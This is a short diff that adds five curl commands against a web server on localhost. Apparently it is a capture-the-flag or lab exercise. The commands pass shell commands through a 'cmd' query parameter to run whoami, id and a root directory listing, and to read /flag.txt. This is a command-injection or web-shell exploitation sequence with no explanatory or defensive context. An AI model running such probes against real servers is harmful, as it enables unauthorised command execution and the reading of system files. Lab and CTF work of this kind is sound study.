@@ -1,0 +1,5 @@
+curl -i -s "http://localhost:8080/"
+curl -s "http://localhost:8080/?cmd=whoami"
+curl -s "http://localhost:8080/?cmd=id"
+curl -s "http://localhost:8080/?cmd=ls%20-l%20/"
+curl -s "http://localhost:8080/?cmd=cat%20/flag.txt"
